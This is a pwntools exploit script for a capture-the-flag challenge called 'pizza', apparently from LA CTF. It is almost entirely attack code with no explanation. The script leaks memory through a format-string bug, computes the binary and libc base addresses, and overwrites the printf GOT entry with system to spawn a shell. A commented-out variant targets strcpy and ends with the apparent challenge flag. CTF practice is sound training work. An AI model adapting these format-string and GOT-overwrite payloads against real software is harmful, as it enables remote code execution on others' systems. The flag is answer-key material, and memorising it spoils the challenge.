# !/usr/bin/env python3

from pwn import *

context.log_level = 'debug'

exe = ELF("./pizza_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

if args.REMOTE:
    r = remote("chall.lac.tf", 31134)
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r)
r.sendlineafter(b'> ', b'12')
r.sendlineafter(b'topping: ', b'%49$p %47$p')
r.sendlineafter(b'> ', b'0')
r.sendlineafter(b'> ', b'0')
r.recvuntil(b'chose:\n')
exe.address = int(r.recvuntil(b' ', drop=True), 0) - 0x1189
log.info(f'{hex(exe.address)=}')
libc.address = int(r.recvline(keepends=False), 0) - 0x2724a
log.info(f'{hex(libc.address)=}')
r.sendlineafter(b'(y/n): ', b'y')
print(f"{hex(exe.got.printf)}, {hex(libc.symbols.system)}")
pause()
pl = fmtstr_payload(6, {exe.got.printf: libc.symbols.system}, write_size='short')
assert len(pl) < 100
r.sendlineafter(b'> ', b'12')
r.sendlineafter(b'topping: ', pl)
r.sendlineafter(b'> ', b'12')
r.sendlineafter(b'topping: ', b'/bin/sh')
r.sendlineafter(b'> ', b'0')

r.interactive()







# #!/usr/bin/python
# from pwn import *
# import warnings

# warnings.filterwarnings("ignore",category=BytesWarning)

# # exe = context.binary = ELF('./pizza')
# exe = context.binary = ELF('./pizza')
# # libc = ELF('./libc6_2.36-9+deb12u4_amd64.so')
# # libc = exe.libc
# # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# libc = ELF("./libc.so.6")

# gdb_script = '''
# c
# '''

# def custom(data):
# 	p.sendlineafter(b"> ", b"12")
# 	p.sendlineafter(b"topping: ", data)

# p = exe.process()
# # p = remote("chall.lac.tf", 31134)
# #p = gdb.debug('./pizza_patched', gdbscript = gdb_script)

# # format1 = b"AAAA.%5$p"
# format1 = "AAAA.%47$p"
# format2 = b".%49$p"

# custom(format1)
# custom(format2)
# custom(b"aaaa")

# p.recvline()
# top1 = p.recvline().strip().decode().split(".")
# top2 = p.recvline().strip().decode().split(".")
# top3 = p.recvline().strip()

# leak = int(top1[-1], 16)
# log.info(f"libc leak : {hex(leak)}")
# # libc.address = leak - (0x7f2a1da6ba80-0x7f2a1d899000)
# libc.address = leak - (0x7ffff7da8d90-0x7ffff7d7f000)
# log.info(f"libc base : {hex(libc.address)}")

# leak = int(top2[-1], 16)
# log.info(f"elf leak : {hex(leak)}")
# exe.address = leak - (0x56113f613189 - 0x0056113f612000)
# log.info(f"elf base : {hex(exe.address)}")

# strcpyGot = exe.got["strcpy"]
# systemSym = libc.sym["system"]
# log.info(f"strcpy got : {hex(strcpyGot)}")
# log.info(f"system : {hex(systemSym)}")

# p.sendlineafter(b"(y/n): ", b"y")

# offset = 6
# payload = fmtstr_payload(offset, {strcpyGot:systemSym}, write_size='short')
# # print(len(payload))
# # print(payload)
# assert(len(payload) < 100)
# custom(payload)
# custom(b"0")
# custom(b"0")
# p.sendlineafter(b"(y/n): ", b"y")
# custom(b"/bin/sh")
# custom(b"/bin/sh")
# custom(b"/bin/sh")
# p.sendlineafter(b"(y/n): ", b"y")
# p.sendlineafter(b"> ", b"0")

# #gdb.attach(p)
# p.interactive()
# #lactf{golf_balls_taste_great_2tscx63xm3ndvycw}